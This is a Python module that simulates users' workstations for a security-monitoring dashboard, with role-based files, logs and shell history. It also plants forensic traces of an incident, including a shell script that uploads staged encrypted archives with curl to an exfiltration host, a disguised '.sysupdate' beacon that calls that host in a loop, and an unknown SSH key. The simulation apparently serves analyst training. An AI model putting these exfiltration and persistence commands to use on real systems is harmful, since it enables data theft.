"""
vfs.py — a simulated workstation for every monitored user.

Each entity in the directory gets a virtual machine: a filesystem, a process
table, network connections, login sessions and disk/memory usage. An analyst can
open a remote shell onto that machine from the dashboard and investigate it with
ordinary commands (whoami, ls, cat, ps, netstat, last, grep, find ...).

Nothing here touches the real host. It is a self-contained simulation whose
contents are generated deterministically from each person's identity and role,
so a lecturer's machine holds lecture material and an ICT administrator's holds
network configuration and credentials — and a machine caught up in an incident
grows the forensic artefacts that incident would leave behind.
"""
from __future__ import annotations
import hashlib
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional

from . import entities as E


# --------------------------------------------------------------- fs nodes
@dataclass
class Node:
    name: str
    is_dir: bool = False
    content: str = ""
    mode: str = "-rw-r--r--"
    owner: str = "root"
    group: str = "root"
    mtime: str = "Mar 12 09:14"
    children: Dict[str, "Node"] = field(default_factory=dict)
    flagged: bool = False          # marked as a forensic artefact

    @property
    def size(self) -> int:
        return 4096 if self.is_dir else len(self.content.encode())

    def add(self, node: "Node") -> "Node":
        self.children[node.name] = node
        return node


def _d(name, owner="root", mode="drwxr-xr-x", mtime="Mar 12 09:14"):
    return Node(name, True, mode=mode, owner=owner, group=owner, mtime=mtime)


def _f(name, content, owner="root", mode="-rw-r--r--", mtime="Mar 12 09:14", flagged=False):
    return Node(name, False, content=content, mode=mode, owner=owner, group=owner,
                mtime=mtime, flagged=flagged)


def _seed(uid: str) -> int:
    return int(hashlib.sha256(uid.encode()).hexdigest()[:8], 16)


# ------------------------------------------------------- role-specific files
def _role_files(e: E.Entity, home: Node, rnd: int) -> None:
    """Populate a home directory with material that fits the person's job."""
    u = e.username
    docs = home.add(_d("Documents", u, mtime="Apr 02 11:20"))
    home.add(_d("Downloads", u, mtime="Apr 05 16:41"))
    desk = home.add(_d("Desktop", u, mtime="Mar 28 08:02"))

    if e.category == "Academic Staff":
        course = ["CSC201 Computer Programming II", "CSC311 Operating Systems",
                  "CSC405 Machine Learning", "CSE301 Digital Systems",
                  "CSC421 Network Security"][rnd % 5]
        code = course.split()[0]
        docs.add(_f(f"{code}_lecture_notes.md",
                    f"# {course}\n\nWeek 1 - Introduction\nWeek 2 - Foundations\n"
                    f"Week 3 - Practical laboratory\nWeek 4 - Continuous assessment\n\n"
                    f"Prepared by {e.name}, {e.role}\n{E.DEPT}, {E.ORG}\n", u, mtime="Apr 01 10:05"))
        docs.add(_f(f"{code}_results_draft.csv",
                    "matric_no,score,grade\nCSC/2021/001,72,A\nCSC/2021/002,58,C\n"
                    "CSC/2021/003,64,B\nCSC/2021/004,41,D\nCSC/2021/005,80,A\n", u,
                    mode="-rw-------", mtime="Apr 04 15:33"))
        docs.add(_f("research_proposal.txt",
                    "Title: Adaptive intrusion detection for campus networks\n"
                    "Status: draft for TETFund submission\n", u, mtime="Mar 22 12:00"))
        desk.add(_f("supervision_list.txt",
                    "Final year project supervision (2024/2025)\n"
                    "1. Adeola O.  - Multi-agent IDS\n2. Ibrahim K. - Federated learning\n"
                    "3. Nkechi U.  - Secure messaging\n", u, mtime="Mar 30 09:10"))

    elif e.category == "ICT Unit":
        ops = home.add(_d("ops", u, mtime="Apr 06 08:45"))
        ops.add(_f("switch_inventory.csv",
                   "device,model,mgmt_ip,location\n"
                   "sw-core-01,Cisco C9300,10.21.0.2,ICT Centre\n"
                   "sw-acad-01,Cisco C2960,10.21.10.2,Faculty Block\n"
                   "sw-lab-01,HP 2530,10.21.20.2,Engineering Annex\n", u, mtime="Apr 06 08:45"))
        ops.add(_f("backup_schedule.md",
                   "# Nightly backups\n- 01:00 portal database -> nas-01\n"
                   "- 02:30 student records -> nas-01\n- 03:15 offsite sync\n", u))
        ops.add(_f("firewall_rules.conf",
                   "# edge firewall (excerpt)\n"
                   "allow tcp any -> 10.21.0.0/16 port 443\n"
                   "allow tcp 10.21.30.0/24 -> any port 22\n"
                   "deny  ip  any -> 10.21.30.10   # server room mgmt\n", u, mode="-rw-r-----"))
        ssh = home.add(_d(".ssh", u, mode="drwx------"))
        ssh.add(_f("known_hosts", "10.21.0.10 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...\n"
                                  "10.21.0.11 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5...\n", u, mode="-rw-------"))
        ssh.add(_f("id_ed25519.pub", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI"
                                     f"{hashlib.md5(u.encode()).hexdigest()[:24]} {u}@{e.host}\n", u))
        docs.add(_f("service_accounts.txt",
                    "portal_svc   -> vault://cse/portal\n"
                    "backup_svc   -> vault://cse/backup\n"
                    "monitoring   -> vault://cse/monitor\n"
                    "# credentials are held in the vault, never in this file\n", u, mode="-rw-------"))

    elif e.category == "Technical Staff":
        lab = home.add(_d("lab", u, mtime="Apr 03 14:10"))
        lab.add(_f("equipment_register.csv",
                   "tag,item,status,last_service\n"
                   "LAB-A-014,Oscilloscope,serviceable,2025-02-11\n"
                   "LAB-A-021,FPGA kit,serviceable,2025-01-30\n"
                   "LAB-B-007,Router set,faulty,2025-03-02\n", u))
        lab.add(_f("lab_roster.txt", "Mon 10-12  CSC201 practical\n"
                                     "Tue 14-16  CSE301 practical\n"
                                     "Thu 10-12  CSC311 practical\n", u))
        docs.add(_f("maintenance_log.md", "# Maintenance log\n- 2025-03-02 replaced PSU on LAB-B-007\n"
                                          "- 2025-02-18 reimaged 6 lab workstations\n", u))

    elif e.category == "Administrative Staff":
        docs.add(_f("staff_list.csv",
                    "name,rank,file_no\nAdebayo Ogunleye,Professor,CSE/001\n"
                    "Folashade Adeniyi,Professor,CSE/002\nChinedu Okafor,Reader,CSE/003\n", u,
                    mode="-rw-------"))
        docs.add(_f("memo_senate.docx.txt",
                    "MEMO\nTo: Faculty Officer\nFrom: Departmental Office\n"
                    "Subject: Submission of 2024/2025 examination results\n", u))
        if "Examinations" in e.role:
            exams = home.add(_d("examinations", u, mode="drwx------", mtime="Apr 07 07:55"))
            exams.add(_f("CSC311_final_questions.txt",
                         "RESTRICTED - EXAMINATION MATERIAL\n"
                         "Q1. Explain demand paging with a worked example. (20 marks)\n"
                         "Q2. Compare round-robin and multilevel feedback queues. (20 marks)\n", u,
                         mode="-rw-------", mtime="Apr 07 07:55"))
            exams.add(_f("broadsheet_2024_2025.csv",
                         "matric_no,CSC201,CSC311,CSE301,gpa\n"
                         "CSC/2021/001,72,68,75,4.21\nCSC/2021/002,58,61,55,3.02\n", u,
                         mode="-rw-------"))

    elif e.category == "Security":
        sec = home.add(_d("security", u, mtime="Apr 06 19:30"))
        sec.add(_f("gate_log.csv",
                   "date,time,gate,plate,purpose\n"
                   "2025-04-06,07:12,Gate 2,LAG-442-KJA,staff\n"
                   "2025-04-06,22:41,Gate 2,OSU-119-AAA,contractor\n", u))
        sec.add(_f("cctv_cameras.txt",
                   "CAM-01 Faculty entrance   192.168.60.11  online\n"
                   "CAM-04 ICT corridor       192.168.60.14  online\n"
                   "CAM-07 Engineering annex  192.168.60.17  offline (since 2025-04-05)\n", u))
        sec.add(_f("incident_book.md", "# Occurrence book\n- 2025-04-05 21:10 door alarm, ICT corridor, cleared\n", u))

    else:  # Postgraduate Research
        res = home.add(_d("research", u, mtime="Apr 05 22:15"))
        res.add(_f("experiment_notes.md",
                   "# Experiments\n- run 14: CERT r4.2 subset, AUC 0.91\n"
                   "- run 15: added conflict-mass feature, AUC 0.94\n", u))
        res.add(_f("train.py",
                   "import numpy as np\n\n# baseline detector for the dissertation\n"
                   "def fit(X):\n    return X.mean(axis=0), X.std(axis=0)\n", u, mode="-rwxr-xr-x"))
        res.add(_d("datasets", u))
        docs.add(_f("thesis_outline.md", "1. Introduction\n2. Literature\n3. Methodology\n"
                                          "4. Results\n5. Conclusion\n", u))


def _bash_history(e: E.Entity) -> str:
    base = {
        "ICT Unit": ["ssh admin@10.21.0.2", "sudo systemctl status nginx", "tail -f /var/log/syslog",
                     "ansible-playbook site.yml --check", "df -h", "sudo ufw status"],
        "Technical Staff": ["lsusb", "dmesg | tail", "sudo apt update", "ping 10.21.20.2", "htop"],
        "Academic Staff": ["cd Documents", "pandoc notes.md -o notes.pdf", "python3 grade.py",
                           "ls -l", "git pull"],
        "Administrative Staff": ["dir", "notepad memo.txt", "explorer ."],
        "Security": ["ping 192.168.60.14", "dir security", "type gate_log.csv"],
        "Postgraduate Research": ["python3 train.py", "nvidia-smi", "jupyter lab --no-browser",
                                  "git status", "scp results.csv nas-01:/backup/"],
    }[e.category]
    return "\n".join(base) + "\n"


# ------------------------------------------------------------- machine build
def build_machine(uid: str) -> Node:
    """Construct the whole virtual filesystem for one entity."""
    e = E.get(uid)
    rnd = _seed(uid)
    u = e.username
    root = _d("/")

    etc = root.add(_d("etc"))
    etc.add(_f("hostname", e.host + "\n"))
    etc.add(_f("os-release", f'PRETTY_NAME="{e.os}"\nID={e.os.split()[0].lower()}\n'))
    etc.add(_f("timezone", "Africa/Lagos\n"))
    passwd_lines = ["root:x:0:0:root:/root:/bin/bash",
                    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
                    f"{u}:x:1000:1000:{e.name}:/home/{u}:/bin/bash",
                    "sshd:x:110:65534::/run/sshd:/usr/sbin/nologin"]
    etc.add(_f("passwd", "\n".join(passwd_lines) + "\n"))
    etc.add(_f("shadow", "root:!:19700:0:99999:7:::\n" + f"{u}:!:19700:0:99999:7:::\n",
               mode="-rw-r-----"))
    etc.add(_f("resolv.conf", "nameserver 10.21.0.5\nnameserver 8.8.8.8\nsearch oauife.edu.ng\n"))
    etc.add(_f("hosts", f"127.0.0.1 localhost\n{e.ip} {e.host}.oauife.edu.ng {e.host}\n"
                        "10.21.0.10 portal.oauife.edu.ng\n10.21.0.11 nas-01\n"))

    var = root.add(_d("var")); log = var.add(_d("log"))
    log.add(_f("auth.log", _auth_log(e), mode="-rw-r-----", mtime="Apr 07 08:02"))
    log.add(_f("syslog", f"Apr  7 07:58:01 {e.host} systemd[1]: Started Daily apt refresh.\n"
                         f"Apr  7 08:00:12 {e.host} kernel: [  0.00] Linux version 6.5.0\n"
                         f"Apr  7 08:01:44 {e.host} NetworkManager: device eth0 activated\n",
               mode="-rw-r-----"))
    log.add(_f("dpkg.log", "2025-04-01 09:12:01 status installed openssh-server:amd64\n"))

    home_root = root.add(_d("home"))
    home = home_root.add(_d(u, u, mtime="Apr 07 08:05"))
    home.add(_f(".bash_history", _bash_history(e), u, mode="-rw-------", mtime="Apr 07 08:05"))
    home.add(_f(".profile", "# ~/.profile\nexport PATH=$PATH:$HOME/.local/bin\n", u))
    _role_files(e, home, rnd)

    root.add(_d("tmp", mode="drwxrwxrwt"))
    root.add(_d("opt")); root.add(_d("usr")); root.add(_d("root", "root", mode="drwx------"))
    return root


def _auth_log(e: E.Entity) -> str:
    u = e.username
    return (f"Apr  7 07:55:01 {e.host} sshd[1201]: Accepted publickey for {u} from {e.ip} port 51422\n"
            f"Apr  7 07:55:01 {e.host} systemd-logind: New session 3 of user {u}.\n"
            f"Apr  7 08:00:22 {e.host} sudo: {u} : TTY=pts/0 ; PWD=/home/{u} ; COMMAND=/usr/bin/apt update\n"
            f"Apr  7 08:02:10 {e.host} CRON[1330]: pam_unix(cron:session): session opened for user root\n")


# ------------------------------------------------- attack artefacts (forensics)
STAGING_DIR = ".cache/.sync"


def plant_artifacts(root: Node, e: E.Entity, kinds: List[str]) -> None:
    """
    Grow the forensic traces an in-progress incident would leave on the machine.
    Called when an entity is under an active simulation, so what the analyst
    finds in the shell matches what the agents are reporting.
    """
    u = e.username
    home = root.children["home"].children.get(u)
    if home is None:
        return

    if "file" in kinds or "exfil" in kinds:
        cache = home.children.get(".cache") or home.add(_d(".cache", u, mode="drwx------", mtime="Apr 07 02:14"))
        sync = cache.children.get(".sync") or cache.add(_d(".sync", u, mode="drwx------", mtime="Apr 07 02:41"))
        sync.add(_f("archive_001.tar.gz.enc", "\x00binary staged archive (14.2 MB)\n" * 3, u,
                    mode="-rw-------", mtime="Apr 07 02:41", flagged=True))
        sync.add(_f("archive_002.tar.gz.enc", "\x00binary staged archive (22.8 MB)\n" * 3, u,
                    mode="-rw-------", mtime="Apr 07 02:47", flagged=True))
        sync.add(_f("manifest.txt",
                    "student_records_2024.csv\nbroadsheet_2024_2025.csv\n"
                    "service_accounts.txt\nswitch_inventory.csv\n", u,
                    mode="-rw-------", mtime="Apr 07 02:47", flagged=True))
    if "network" in kinds or "exfil" in kinds:
        cache = home.children.get(".cache") or home.add(_d(".cache", u, mode="drwx------"))
        cache.add(_f("upload.sh",
                     "#!/bin/sh\n# staged uploader\n"
                     f"for f in $HOME/{STAGING_DIR}/*.enc; do\n"
                     f"  curl -s -T \"$f\" https://{E.EXFIL_DST}/u/ >/dev/null 2>&1\n"
                     "  sleep 37\n"
                     "done\n", u, mode="-rwx------", mtime="Apr 07 02:12", flagged=True))
    if "identity" in kinds or "lateral" in kinds:
        ssh = home.children.get(".ssh") or home.add(_d(".ssh", u, mode="drwx------"))
        ssh.add(_f("authorized_keys",
                   "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7x2 unknown@unknown  # added Apr 07 01:58\n",
                   u, mode="-rw-------", mtime="Apr 07 01:58", flagged=True))
        root.children["var"].children["log"].children["auth.log"].content += (
            f"Apr  7 01:44:12 {e.host} sshd[2210]: Failed password for {u} from 10.21.60.22 port 44120\n"
            f"Apr  7 01:44:19 {e.host} sshd[2210]: Failed password for {u} from 10.21.60.22 port 44121\n"
            f"Apr  7 01:44:27 {e.host} sshd[2210]: Failed password for {u} from 10.21.60.22 port 44122\n"
            f"Apr  7 01:45:03 {e.host} sshd[2213]: Accepted password for {u} from 10.21.60.22 port 44130\n"
            f"Apr  7 01:58:40 {e.host} sudo: {u} : TTY=pts/1 ; PWD=/home/{u} ; COMMAND=/usr/bin/tee .ssh/authorized_keys\n")
    if "host" in kinds:
        home.add(_f(".sysupdate", "#!/bin/sh\nwhile true; do sleep 300; "
                                  f"curl -s https://{E.EXFIL_DST}/b >/dev/null; done\n",
                    u, mode="-rwx------", mtime="Apr 07 01:51", flagged=True))
